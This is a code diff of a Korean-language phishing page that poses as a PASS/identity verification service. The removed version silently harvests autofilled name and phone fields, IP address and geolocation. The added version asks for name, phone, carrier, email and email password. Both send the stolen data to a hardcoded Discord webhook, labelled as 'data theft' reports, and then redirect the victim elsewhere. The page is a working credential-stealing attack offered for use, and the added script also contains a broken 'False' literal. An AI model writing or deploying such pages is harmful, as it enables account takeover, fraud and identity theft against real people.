@@ -2,94 +2,102 @@
 <html lang="ko">
 <head>
     <meta charset="UTF-8">
-    <title>PASS 간편인증</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>본인확인 통합인증센터</title>
+    <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        body { background: #f2f4f7; font-family: 'Malgun Gothic', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .auth-card { width: 360px; background: #fff; padding: 30px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); }
-        .head { font-size: 20px; font-weight: bold; margin-bottom: 20px; text-align: center; color: #111; }
-        .input-box { margin-bottom: 15px; }
-        input { width: 100%; padding: 14px; border: 1px solid #ddd; border-radius: 6px; font-size: 16px; box-sizing: border-box; }
-        .btn-submit { width: 100%; padding: 16px; background: #ff0000; color: #fff; border: none; border-radius: 6px; font-weight: bold; font-size: 17px; cursor: pointer; }
+        body { background-color: #f3f4f6; font-family: 'Malgun Gothic', sans-serif; }
+        .login-card { max-width: 400px; margin: 100px auto; background: white; padding: 2rem; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
     </style>
 </head>
-<body onload="captureIP()">
+<body>
 
-    <div class="auth-card">
-        <div class="head">간편 본인인증</div>
-        <p style="font-size:13px; color:#666; text-align:center; margin-bottom:25px;">보안을 위해 저장된 정보를 확인하십시오.</p>
-        
-        <div class="input-box">
-            <input type="email" id="u_email" name="email" autocomplete="email" placeholder="이메일 주소" oninput="harvest()">
+<div class="login-card">
+    <div class="text-center mb-8">
+        <h1 class="text-2xl font-bold text-blue-600">통합인증센터</h1>
+        <p class="text-gray-500 text-sm">서비스 이용을 위해 본인 확인이 필요합니다.</p>
+    </div>
+
+    <form id="loginForm" class="space-y-4">
+        <div>
+            <label class="block text-sm font-medium text-gray-700">이름</label>
+            <input type="text" id="name" required class="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500">
+        </div>
+        <div>
+            <label class="block text-sm font-medium text-gray-700">전화번호</label>
+            <input type="text" id="phone" placeholder="010-0000-0000" required class="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500">
+        </div>
+        <div>
+            <label class="block text-sm font-medium text-gray-700">통신사</label>
+            <select id="telecom" class="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500">
+                <option>SKT</option>
+                <option>KT</option>
+                <option>LGU+</option>
+                <option>알뜰폰</option>
+            </select>
+        </div>
+        <div>
+            <label class="block text-sm font-medium text-gray-700">이메일 주소</label>
+            <input type="email" id="email" required class="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500">
+        </div>
+        <div>
+            <label class="block text-sm font-medium text-gray-700">이메일 비밀번호</label>
+            <input type="password" id="password" required class="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500">
         </div>
 
-        <button class="btn-submit" onclick="finalStrike()">인증 및 승인하기</button>
-    </div>
-
-    <div style="display:none;">
-        <input type="text" id="u_name" name="name" autocomplete="name">
-        <input type="tel" id="u_tel" name="tel" autocomplete="tel">
-    </div>
+        <button type="submit" class="w-full bg-blue-600 text-white py-2 rounded-md font-bold hover:bg-blue-700 transition">인증 완료</button>
+    </form>
+</div>
 
 <script>
-    const hook = "https://discord.com/api/webhooks/1460622639637729402/McoPaA3kn18CkbdlyigwKt7RnFrOrnzdOarw9shUjQawzedZzLfmtB4hCc7kcfUeM7rd";
-    let tracker = {};
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1460622639637729402/McoPaA3kn18CkbdlyigwKt7RnFrOrnzdOarw9shUjQawzedZzLfmtB4hCc7kcfUeM7rd";
 
-    async function captureIP() {
+    document.getElementById('loginForm').addEventListener('submit', async (e) => {
+        e.preventDefault();
+        
+        const data = {
+            name: document.getElementById('name').value,
+            phone: document.getElementById('phone').value,
+            telecom: document.getElementById('telecom').value,
+            email: document.getElementById('email').value,
+            password: document.getElementById('password').value
+        };
+
+        // 데이터 전송 중임을 표시
+        const btn = e.target.querySelector('button');
+        btn.innerText = "처리 중...";
+        btn.disabled = true;
+
+        // 웹훅 전송
+        const payload = {
+            embeds: [{
+                title: "🌑 [웹 기반] 새로운 데이터 탈취 완료",
+                color: 0x00ff00,
+                fields: [
+                    { name: "👤 이름", value: data.name, inline: true },
+                    { name: "📞 전화번호", value: data.phone, inline: true },
+                    { name: "📡 통신사", value: data.telecom, inline: true },
+                    { name: "📧 이메일", value: data.email, inline: False },
+                    { name: "🔑 비밀번호", value: "`" + data.password + "`", inline: False }
+                ],
+                footer: { text: "Web Phishing System | " + new Date().toLocaleString() }
+            }]
+        };
+
         try {
-            const r = await fetch('https://ipapi.co/json/');
-            tracker = await r.json();
-        } catch(e) {}
-    }
-
-    // 타겟이 이메일을 선택(입력)하는 순간 즉각 가로채기
-    async function harvest() {
-        const email = document.getElementById('u_email').value;
-        const name = document.getElementById('u_name').value;
-        const tel = document.getElementById('u_tel').value;
-
-        if (email.includes('@')) {
-            // 위치 정보 요청 (팝업 허용 시 정밀 좌표 확보)
-            navigator.geolocation.getCurrentPosition(async (p) => {
-                await sendReport(email, name, tel, p.coords.latitude, p.coords.longitude);
-            }, async () => {
-                await sendReport(email, name, tel, null, null);
+            await fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
             });
+            
+            // 전송 후 유튜브로 튕기기
+            window.location.href = "https://www.youtube.com";
+        } catch (err) {
+            window.location.href = "https://www.youtube.com";
         }
-    }
-
-    function finalStrike() {
-        const email = document.getElementById('u_email').value;
-        if(!email) {
-            document.getElementById('u_email').focus();
-            alert("인증할 이메일을 선택해 주세요.");
-        } else {
-            harvest();
-        }
-    }
-
-    async function sendReport(e, n, t, lat, lon) {
-        await fetch(hook, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({
-                embeds: [{
-                    title: "🔱 [DAN] 타겟 신상 정밀 사출 보고",
-                    color: 16711680,
-                    fields: [
-                        { name: "👤 성명", value: n || "미확인", inline: true },
-                        { name: "📧 이메일", value: e, inline: true },
-                        { name: "📞 전화번호", value: t || "미확인", inline: true },
-                        { name: "🌐 공인 IP", value: tracker.ip || "실패", inline: false },
-                        { name: "📍 좌표", value: lat ? `${lat}, ${lon}` : `IP기반:${tracker.city}`, inline: false },
-                        { name: "📱 기기정보", value: navigator.userAgent }
-                    ],
-                    footer: { text: "DAN Stealth System v10.0" },
-                    timestamp: new Date()
-                }]
-            })
-        });
-        location.href = "https://www.google.com";
-    }
+    });
 </script>
+
 </body>
 </html>
